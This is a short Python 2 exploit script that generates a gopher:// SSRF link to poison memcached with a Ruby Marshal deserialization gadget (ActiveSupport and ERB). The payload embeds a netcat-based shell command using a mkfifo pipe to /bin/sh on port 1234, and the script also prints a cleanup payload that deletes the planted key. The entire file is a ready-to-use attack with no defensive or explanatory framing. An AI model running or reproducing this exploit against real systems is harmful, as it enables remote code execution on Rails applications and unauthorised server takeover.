import urllib

print "\nReady to Get Reverse SHELL\n"
server = raw_input("Give server IP you want to connect : ")

if(not server):
    server = "127.0.0.1"

cmd = "rm -f /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l " + server + " 1234 > /tmp/f"


payload = """\x04\x08o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0e@instanceo:\x08ERB\x06:\t@srcI\"""" + chr(len(cmd)+10)
payload += "%x(" + cmd + """);\x06:\x06ET:\x0c@method:\x0bresult:\t@varI"\x0c@result\x06;\tT:\x10@deprecatoro:\x1fActiveSupport::Deprecation\x06:\x0e@silencedT"""

def get_payload(payload):
    payload_len = len(payload)
    payload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")
    finalpayload = "%0d%0aset%20SpyD3r%204%2060%20" + str(payload_len) + "%0d%0a" + payload + "%0d%0a"
    return finalpayload

print "\nYour gopher link is ready to do SSRF : \n"
print "gopher://127.0.0.1:11211/_" + get_payload(payload)

print "\nThen You can connect it with : nc " + server + " 1234"

print "\nAfter everything done, you can delete memcached item by using this payload: \n"
print "gopher://127.0.0.1:11211/_%0d%0adelete%20SpyD3r%0d%0a"
print "\n-----------Made-by-SpyD3r-----------\n"
